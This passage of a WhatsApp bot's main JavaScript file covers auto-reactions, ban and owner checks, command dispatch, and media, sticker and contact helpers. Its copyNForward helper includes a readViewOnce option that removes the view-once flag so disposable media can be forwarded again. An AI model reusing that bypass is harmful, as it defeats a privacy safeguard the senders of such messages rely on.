'💝', '💖', '💗', '💓', '💞', '💕', '💟', '❣️', '💔', "❤️‍🔥", "❤️‍🩹", '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💯', '💢', '💥', '💫', '💦', '💨', "🕳️", '💣', '💬', "👁️‍🗨️", "🗨️", "🗯️", '💭', '💤', '👋', '🤚', "🖐️", '✋', '🖖', '👌', '🤌', '🤏', '✌️', '🤞', '🤟', '🤘', '🤙', '👈', '👉', '👆', '🖕', '👇', '☝️', '👍', '👎', '✊', '👊', '🤛', '🤜', '👏', '🙌', '👐', '🤲', '🤝', '🙏', '✍️', '💅', '🤳', '💪', '🦾', '🦿', '🦵', '🦶', '👂', '🦻', '👃', '🧠', '🫀', '🫁', '🦷', '🦴', '👀', "👁️", '👅', '👄', '👶', '🧒', '👦', '👧', '🧑', '👱', '👨', '🧔', "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", '👩', "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", '🧓', '👴', '👵', '🙍', "🙍‍♂️", "🙍‍♀️", '🙎', "🙎‍♂️", "🙎‍♀️", '🙅', "🙅‍♂️", "🙅‍♀️", '🙆', "🙆‍♂️", "🙆‍♀️", '💁', "💁‍♂️", "💁‍♀️", '🙋', "🙋‍♂️", "🙋‍♀️", '🧏', "🧏‍♂️", "🧏‍♀️", '🙇', "🙇‍♂️", "🙇‍♀️", '🤦', "🤦‍♂️", "🤦‍♀️", '🤷', "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", '👨‍🏫', "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", '👮', "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", '💂', "💂‍♂️", "💂‍♀️", '🥷', '👷', "👷‍♂️", "👷‍♀️", '🤴', '👸', '👳', "👳‍♂️", "👳‍♀️", '👲', '🧕', '🤵', "🤵‍♂️", "🤵‍♀️", '👰', "👰‍♂️", "👰‍♀️", '🤰', '🤱', "👩‍🍼", "👨‍🍼", "🧑‍🍼", '👼', '🎅', '🤶', "🧑‍🎄", '🦸', "🦸‍♂️", "🦸‍♀️", '🦹', "🦹‍♂️", "🦹‍♀️", '🧙', "🧙‍♂️", "🧙‍♀️", '🧚', "🧚‍♂️", "🧚‍♀️", '🧛', "🧛‍♂️", "🧛‍♀️", '🧜', "🧜‍♂️", "🧜‍♀️", '🧝', "🧝‍♂️", "🧝‍♀️", '🧞', "🧞‍♂️", "🧞‍♀️", '🧟', "🧟‍♂️", "🧟‍♀️", '💆', "💆‍♂️", "💆‍♀️", '💇', "💇‍♂️", "💇‍♀️", '🚶', "🚶‍♂️", "🚶‍♀️", '🧍', "🧍‍♂️", "🧍‍♀️", '🧎', "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", '🏃', "🏃‍♂️", "🏃‍♀️", '💃', '🕺', "🕴️", '👯', "👯‍♂️", "👯‍♀️", '🧖', "🧖‍♂️", "🧖‍♀️", '🧗', "🧗‍♂️", "🧗‍♀️", '🤺', '🏇', '⛷️', '🏂', "🏌️", "🏌️‍♂️", "🏌️‍♀️", '🏄', "🏄‍♂️", "🏄‍♀️", '🚣', "🚣‍♂️", "🚣‍♀️", '🏊', "🏊‍♂️", "🏊‍♀️", '⛹️', "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", '🚴', "🚴‍♂️", '🚴‍♀️', '🚵', "🚵‍♂️", "🚵‍♀️", '🤸', "🤸‍♂️", "🤸‍♀️", '🤼', "🤼‍♂️", "🤼‍♀️", '🤽', "🤽‍♂️", "🤽‍♀️", '🤾', "🤾‍♂️", "🤾‍♀️", '🤹', "🤹‍♂️", "🤹‍♀️", '🧘', "🧘‍♂️", "🧘‍♀️", '🛀', '🛌', "🧑‍🤝‍🧑", '👭', '👫', '👬', '💏', "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", '💑', "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", '👪', "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", '👨‍👨‍👧', "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", '👤', '👥', '🫂', '👣', '🦰', '🦱', '🦳', '🦲', '🐵'];
                const randomOwnerReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
                m.react(randomOwnerReaction);
            }
        }

        // custum react settings        

        if (!isReact && senderNumber !== botNumber) {
            if (config.CUSTOM_REACT === 'true') {
                // Use custom emojis from the configuration
                const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomReaction);
            }
        }

        if (!isReact && senderNumber === botNumber) {
            if (config.HEART_REACT === 'true') {
                // Use custom emojis from the configuration
                const reactions = (config.CUSTOM_REACT_EMOJIS || '❤️,🧡,💛,💚,💚').split(',');
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomReaction);
            }
        }

        /*//==========WORKTYPE============ 
  if(!isOwner && config.MODE === "private") return
  if(!isOwner && isGroup && config.MODE === "inbox") return
  if(!isOwner && !isGroup && config.MODE === "groups") return
   */

        const bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
        const isBanned = bannedUsers.includes(sender);

        if (isBanned) return; // Ignore banned users completely

        const ownerFile = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8')); // خواندن فایل
        const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
        // بررسی اینکه آیا فرستنده در owner.json موجود است
        const isFileOwner = ownerFile.includes(sender);
        const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
        // اعمال شرایط بر اساس وضعیت مالک
        if (!isRealOwner && config.MODE === "private") return;
        if (!isRealOwner && isGroup && config.MODE === "inbox") return;
        if (!isRealOwner && !isGroup && config.MODE === "groups") return;


        // take commands 

        const events = require('./command')
        const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
        if (isCmd) {
            const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
            if (cmd) {
                if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })

                try {
                    cmd.function(conn, mek, m, { from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
                } catch (e) {
                    console.error("[PLUGIN ERROR] " + e);
                }
            }
        }
        events.commands.map(async(command) => {
            if (body && command.on === "body") {
                command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
            } else if (mek.q && command.on === "text") {
                command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
            } else if (
                (command.on === "image" || command.on === "photo") &&
                mek.type === "imageMessage"
            ) {
                command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
            } else if (
                command.on === "sticker" &&
                mek.type === "stickerMessage"
            ) {
                command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
            }
        });

    });
    //===================================================   
    conn.decodeJid = jid => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return (
                (decode.user &&
                    decode.server &&
                    decode.user + '@' + decode.server) ||
                jid
            );
        } else return jid;
    };
    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
            let vtype
            if (options.readViewOnce) {
                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                delete message.message.viewOnceMessage.message[vtype].viewOnce
                message.message = {
                    ...message.message.viewOnceMessage.message
                }
            }

            let mtype = Object.keys(message.message)[0]
            let content = await generateForwardMessageContent(message, forceForward)
            let ctype = Object.keys(content)[0]
            let context = {}
            if (mtype != "conversation") context = message.message[mtype].contextInfo
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo
            }
            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                ...content[ctype],
                ...options,
                ...(options.contextInfo ? {
                    contextInfo: {
                        ...content[ctype].contextInfo,
                        ...options.contextInfo
                    }
                } : {})
            } : {})
            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
            return waMessage
        }
        //=================================================
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
            let quoted = message.msg ? message.msg : message
            let mime = (message.msg || message).mimetype || ''
            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
            const stream = await downloadContentFromMessage(quoted, messageType)
            let buffer = Buffer.from([])
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk])
            }
            let type = await FileType.fromBuffer(buffer)
            trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
                // save to file
            await fs.writeFileSync(trueFileName, buffer)
            return trueFileName
        }
        //=================================================
    conn.downloadMediaMessage = async(message) => {
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(message, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }

        return buffer
    }

    /**
     *
     * @param {*} jid
     * @param {*} message
     * @param {*} forceForward
     * @param {*} options
     * @returns
     */
    //================================================
    conn.sendFileUrl = async(jid, url, caption, quoted, options = {}) => {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            if (mime.split("/")[1] === "gif") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
            }
            let type = mime.split("/")[0] + "Message"
            if (mime === "application/pdf") {
                return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
            }
            if (mime.split("/")[0] === "image") {
                return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
            }
            if (mime.split("/")[0] === "video") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
            }
            if (mime.split("/")[0] === "audio") {
                return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
            }
        }
        //==========================================================
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
        //let copy = message.toJSON()
        let mtype = Object.keys(copy.message)[0]
        let isEphemeral = mtype === 'ephemeralMessage'
        if (isEphemeral) {
            mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
        }
        let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
        let content = msg[mtype]
        if (typeof content === 'string') msg[mtype] = text || content
        else if (content.caption) content.caption = text || content.caption
        else if (content.text) content.text = text || content.text
        if (typeof content !== 'string') msg[mtype] = {
            ...content,
            ...options
        }
        if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
        else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
        if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
        else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
        copy.key.remoteJid = jid
        copy.key.fromMe = sender === conn.user.id

        return proto.WebMessageInfo.fromObject(copy)
    }


    /**
     *
     * @param {*} path
     * @returns
     */
    //=====================================================
    conn.getFile = async(PATH, save) => {
            let res
            let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
                //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
            let type = await FileType.fromBuffer(data) || {
                mime: 'application/octet-stream',
                ext: '.bin'
            }
            let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
            if (data && save) fs.promises.writeFile(filename, data)
            return {
                res,
                filename,
                size: await getSizeMedia(data),
                ...type,
                data
            }

        }
        //=====================================================
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
            let types = await conn.getFile(PATH, true)
            let { filename, size, ext, mime, data } = types
            let type = '',
                mimetype = mime,
                pathFile = filename
            if (options.asDocument) type = 'document'
            if (options.asSticker || /webp/.test(mime)) {
                let { writeExif } = require('./exif.js')
                let media = { mimetype: mime, data }
                pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
                await fs.promises.unlink(filename)
                type = 'sticker'
                mimetype = 'image/webp'
            } else if (/image/.test(mime)) type = 'image'
            else if (/video/.test(mime)) type = 'video'
            else if (/audio/.test(mime)) type = 'audio'
            else type = 'document'
            await conn.sendMessage(jid, {
                [type]: { url: pathFile },
                mimetype,
                fileName,
                ...options
            }, { quoted, ...options })
            return fs.promises.unlink(pathFile)
        }
        //=====================================================
    conn.parseMention = async(text) => {
            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
        }
        //=====================================================
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
            let types = await conn.getFile(path, true)
            let { mime, ext, res, data, filename } = types
            if (res && res.status !== 200 || file.length <= 65536) {
                try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
            }
            let type = '',
                mimetype = mime,
                pathFile = filename
            if (options.asDocument) type = 'document'
            if (options.asSticker || /webp/.test(mime)) {
                let { writeExif } = require('./exif')
                let media = { mimetype: mime, data }
                pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
                await fs.promises.unlink(filename)
                type = 'sticker'
                mimetype = 'image/webp'
            } else if (/image/.test(mime)) type = 'image'
            else if (/video/.test(mime)) type = 'video'
            else if (/audio/.test(mime)) type = 'audio'
            else type = 'document'
            await conn.sendMessage(jid, {
                [type]: { url: pathFile },
                caption,
                mimetype,
                fileName,
                ...options
            }, { quoted, ...options })
            return fs.promises.unlink(pathFile)
        }
        /**
         *
         * @param {*} message
         * @param {*} filename
         * @param {*} attachExtension
         * @returns
         */
        //=====================================================
    conn.sendVideoAsSticker = async(jid, buff, options = {}) => {
        let buffer;
        if (options && (options.packname || options.author)) {
            buffer = await writeExifVid(buff, options);
        } else {
            buffer = await videoToWebp(buff);
        }
        await conn.sendMessage(
            jid, { sticker: { url: buffer }, ...options },
            options
        );
    };
    //=====================================================
    conn.sendImageAsSticker = async(jid, buff, options = {}) => {
        let buffer;
        if (options && (options.packname || options.author)) {
            buffer = await writeExifImg(buff, options);
        } else {
            buffer = await imageToWebp(buff);
        }
        await conn.sendMessage(
            jid, { sticker: { url: buffer }, ...options },
            options
        );
    };
    /**
     *
     * @param {*} jid
     * @param {*} path
     * @param {*} quoted
     * @param {*} options
     * @returns
     */
    //=====================================================
    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })

    /**
     *
     * @param {*} jid
     * @param {*} path
     * @param {*} quoted
     * @param {*} options
     * @returns
     */
    //=====================================================
    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
        let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
        return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }

    /**
     *
     * @param {*} jid
     * @param {*} path
     * @param {*} caption
     * @param {*} quoted
     * @param {*} options
     * @returns
     */
    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })

    /**
     *
     * @param {*} jid
     * @param {*} path
     * @param {*} caption
     * @param {*} quoted
     * @param {*} options
     * @returns
     */
    //=====================================================
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
            let buttonMessage = {
                    text,
                    footer,
                    buttons,
                    headerType: 2,
                    ...options
                }
                //========================================================================================================================================
            conn.sendMessage(jid, buttonMessage, { quoted, ...options })
        }
        //=====================================================
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
        let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
        var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
            templateMessage: {
                hydratedTemplate: {
                    imageMessage: message.imageMessage,
                    "hydratedContentText": text,
                    "hydratedFooterText": footer,
                    "hydratedButtons": but
                }
            }
        }), options)
        conn.relayMessage(jid, template.message, { messageId: template.key.id })
    }

    /**
     *
     * @param {*} jid
     * @param {*} buttons
     * @param {*} caption
     * @param {*} footer
     * @param {*} quoted
     * @param {*} options
     */
    //=====================================================
    conn.getName = (jid, withoutContact = false) => {
        id = conn.decodeJid(jid);

        withoutContact = conn.withoutContact || withoutContact;

        let v;

        if (id.endsWith('@g.us'))
            return new Promise(async resolve => {
                v = store.contacts[id] || {};

                if (!(v.name.notify || v.subject))
                    v = conn.groupMetadata(id) || {};

                resolve(
                    v.name ||
                    v.subject ||
                    PhoneNumber(
                        '+' + id.replace('@s.whatsapp.net', ''),
                    ).getNumber('international'),
                );
            });
        else
            v =
            id === '0@s.whatsapp.net' ?
            {
                id,

                name: 'WhatsApp',
            } :
            id === conn.decodeJid(conn.user.id) ?
            conn.user :
            store.contacts[id] || {};

        return (
            (withoutContact ? '' : v.name) ||
            v.subject ||
            v.verifiedName ||
            PhoneNumber(
                '+' + jid.replace('@s.whatsapp.net', ''),
            ).getNumber('international')
        );
    };

    // Vcard Functionality
    conn.sendContact = async(jid, kon, quoted = '', opts = {}) => {
        let list = [];
        for (let i of kon) {
            list.push({
                displayName: await conn.getName(i + '@s.whatsapp.net'),
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                        i + '@s.whatsapp.net',
                    )}\nFN:${
                        global.OwnerName
                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
                        global.email
                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                        global.github
                    }/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                        global.location
                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
            });
        }
        conn.sendMessage(
            jid, {
                contacts: {
                    displayName: `${list.length} Contact`,
                    contacts: list,
                },
                ...opts,
            }, { quoted },
        );
    };

    // Status aka brio
    conn.setStatus = status => {
        conn.query({
            tag: 'iq',
            attrs: {
                to: '@s.whatsapp.net',
                type: 'set',
                xmlns: 'status',
            },
            content: [{
                tag: 'status',
                attrs: {},
                content: Buffer.from(status, 'utf-8'),
            }, ],
        });
        return status;
    };
    conn.serializeM = mek => sms(conn, mek, store);
}
/* 
  app.get("/", (req, res) => {
  res.send("SUBZERO STARTED ✅");
  });
*/
app.use(express.static(path.join(__dirname, 'lib')));

app.get('/', (req, res) => {
    res.redirect('/subzero.html');
});
app.listen(port, () => console.log(`WELCOME BRO, PLEASE STAR & FORK 💙`));
setTimeout(() => {
    connectToWA()
}, 4000);
